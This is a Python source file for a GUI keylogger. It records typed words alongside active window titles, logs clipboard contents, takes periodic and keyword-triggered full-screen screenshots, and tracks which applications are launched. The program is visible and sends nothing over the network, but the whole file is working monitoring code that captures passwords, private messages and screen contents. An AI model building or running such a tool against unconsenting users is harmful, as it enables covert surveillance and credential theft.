import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
from pynput import keyboard
from collections import Counter
from prettytable import PrettyTable
from PIL import ImageGrab
import threading
import time
import pyperclip
import psutil
import win32gui
import win32process

typed_words = []
current_word = ""
listener = None
logging = False
screenshot_running = False
clipboard_monitoring = True
keywords = set()
last_clipboard = ""
active_window_log = []

# Log writer
def write(text):
    try:
        with open("keylogger.txt", 'a') as f:
            f.write(text)
    except Exception as e:
        print(f"Write error: {e}")

def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except:
        return "Unknown"

# Key press handler
def on_key_press(Key):
    global current_word, typed_words
    try:
        win_title = get_active_window_title()
        if hasattr(Key, 'char') and Key.char is not None:
            current_word += Key.char
        elif Key == keyboard.Key.space or Key == keyboard.Key.enter:
            if current_word.strip():
                word = current_word.strip()
                typed_words.append(word)
                write(word + " ")
                active_window_log.append((time.strftime("%H:%M:%S"), win_title, word))
                active_window_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {win_title}: {word}\n")
                check_keyword_and_capture(word)
                current_word = ""
    except Exception as e:
        print(f"Key press error: {e}")

def on_key_release(Key):
    if Key == keyboard.Key.esc:
        stop_logging()
        return False
    elif Key == keyboard.Key.ctrl_l or Key == keyboard.Key.ctrl_r:
        try:
            pasted = pyperclip.paste()
            if pasted.strip():
                clipboard_text.insert(tk.END, f"[Paste] {pasted}\n")
        except:
            pass

def take_screenshots():
    count = 1
    global screenshot_running
    screenshot_running = True
    while screenshot_running:
        try:
            screenshot = ImageGrab.grab()
            filename = f"screenshot_{count}.png"
            screenshot.save(filename)
            count += 1
            time.sleep(60)
        except Exception as e:
            print(f"Screenshot error: {e}")
            break

def capture_screenshot(keyword_triggered=False):
    try:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"keyword_screenshot_{timestamp}.png" if keyword_triggered else f"screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        if keyword_triggered:
            output_text.insert(tk.END, f"Screenshot captured for keyword at {timestamp}\n")
    except Exception as e:
        print(f"Instant Screenshot Error: {e}")

def check_keyword_and_capture(word):
    if word.lower() in keywords:
        capture_screenshot(keyword_triggered=True)

def start_logging():
    global listener, logging
    if logging:
        return
    logging = True
    output_text.insert(tk.END, "Keylogger started...\n")

    with open("keylogger.txt", "w"):
        pass

    listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
    listener.start()

    if screenshot_checkbox_var.get():
        threading.Thread(target=take_screenshots, daemon=True).start()

    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=monitor_apps, daemon=True).start()

def stop_logging():
    global logging, screenshot_running
    if not logging:
        return
    logging = False
    screenshot_running = False
    output_text.insert(tk.END, "Keylogger stopped.\n")
    show_analysis()

def add_keyword():
    word = keyword_entry.get().strip().lower()
    if word:
        keywords.add(word)
        keyword_listbox.insert(tk.END, word)
        keyword_entry.delete(0, tk.END)

def show_analysis():
    try:
        with open("keylogger.txt", 'r') as f:
            data = f.read()
    except FileNotFoundError:
        messagebox.showerror("Error", "Log file not found!")
        return

    words = data.split()
    total_words = len(words)
    word_count = Counter(words)

    table = PrettyTable()
    table.field_names = ["Word", "Frequency"]
    for word, count in word_count.most_common(10):
        table.add_row([word, count])

    output_text.insert(tk.END, f"\nTotal Words Typed: {total_words}")
    output_text.insert(tk.END, f"\nUnique Words Used: {len(word_count)}\n")
    output_text.insert(tk.END, f"\nTop 10 Words:\n{table}\n")

def monitor_clipboard():
    global last_clipboard
    while logging:
        try:
            content = pyperclip.paste()
            if content and content != last_clipboard:
                clipboard_text.insert(tk.END, f"[Copy] {content}\n")
                last_clipboard = content
        except Exception as e:
            print(f"Clipboard Monitor Error: {e}")
        time.sleep(1)

def is_gui_app(pid):
    def callback(hwnd, pid_list):
        try:
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid in pid_list and win32gui.IsWindowVisible(hwnd):
                pid_list.remove(found_pid)
        except:
            pass
        return True

    pid_list = [pid]
    win32gui.EnumWindows(callback, pid_list)
    return len(pid_list) == 0

def monitor_apps():
    known_apps = set()
    while logging:
        try:
            current_apps = set()
            for proc in psutil.process_iter(['pid', 'name']):
                pid = proc.info['pid']
                name = proc.info['name']
                if name and is_gui_app(pid):
                    current_apps.add((pid, name))

            new_apps = current_apps - known_apps
            for pid, name in new_apps:
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                app_text.insert(tk.END, f"[{timestamp}] GUI App Opened: {name}\n")

            known_apps = current_apps
        except Exception as e:
            print(f"App Monitor Error: {e}")
        time.sleep(3)

# --- GUI Setup ---
root = tk.Tk()
root.title("Enhanced Python Keylogger")
root.geometry("900x800")
root.configure(bg="#f5f5f5")

tab_control = ttk.Notebook(root)

# Style
style = ttk.Style()
style.theme_use("clam")
style.configure("TNotebook", background="#f5f5f5", padding=5)
style.configure("TNotebook.Tab", font=('Helvetica', 11, 'bold'), padding=[10, 5])
style.map("TNotebook.Tab", background=[("selected", "#d9ead3")])

def create_header(parent, text):
    label = tk.Label(parent, text=text, font=("Helvetica", 13, "bold"), bg="#f5f5f5", fg="#333")
    label.pack(pady=6)

# --- Main Keylogger Tab ---
main_tab = tk.Frame(tab_control, bg="#f5f5f5")
tab_control.add(main_tab, text="Keylogger")

create_header(main_tab, "Keylogger Controls")
tk.Button(main_tab, text="Start Keylogger", command=start_logging, bg="#4CAF50", fg="white", font=("Arial", 12), width=20).pack(pady=5)
tk.Button(main_tab, text="Stop Keylogger", command=stop_logging, bg="#f44336", fg="white", font=("Arial", 12), width=20).pack(pady=5)

screenshot_checkbox_var = tk.BooleanVar()
tk.Checkbutton(main_tab, text="Enable Periodic Screenshots", variable=screenshot_checkbox_var, font=("Arial", 11), bg="#f5f5f5").pack(pady=5)

create_header(main_tab, "Keyword Detection")
keyword_entry = tk.Entry(main_tab, width=40, font=("Arial", 11))
keyword_entry.pack(pady=2)
tk.Button(main_tab, text="Add Keyword", command=add_keyword, font=("Arial", 10)).pack(pady=2)
keyword_listbox = tk.Listbox(main_tab, height=5, width=40, font=("Courier", 10))
keyword_listbox.pack(pady=5)

create_header(main_tab, "Logs and Analysis")
output_text = scrolledtext.ScrolledText(main_tab, wrap=tk.WORD, width=100, height=15, font=("Courier", 10))
output_text.pack(padx=10, pady=10)

# --- Clipboard Tab ---
clipboard_tab = tk.Frame(tab_control, bg="#f5f5f5")
tab_control.add(clipboard_tab, text="Clipboard Monitor")
create_header(clipboard_tab, "Clipboard Events")
clipboard_text = scrolledtext.ScrolledText(clipboard_tab, wrap=tk.WORD, width=100, height=30, font=("Courier", 10))
clipboard_text.pack(padx=10, pady=10)

# --- Application Monitor Tab ---
app_tab = tk.Frame(tab_control, bg="#f5f5f5")
tab_control.add(app_tab, text="App Monitor")
create_header(app_tab, "GUI Applications Opened")
app_text = scrolledtext.ScrolledText(app_tab, wrap=tk.WORD, width=100, height=30, font=("Courier", 10))
app_text.pack(padx=10, pady=10)

# --- Active Window Tracker Tab ---
active_tab = tk.Frame(tab_control, bg="#f5f5f5")
tab_control.add(active_tab, text="Active Window Tracker")
create_header(active_tab, "Window Activity While Typing")
active_window_text = scrolledtext.ScrolledText(active_tab, wrap=tk.WORD, width=100, height=30, font=("Courier", 10))
active_window_text.pack(padx=10, pady=10)

tab_control.pack(expand=1, fill='both')
root.mainloop()
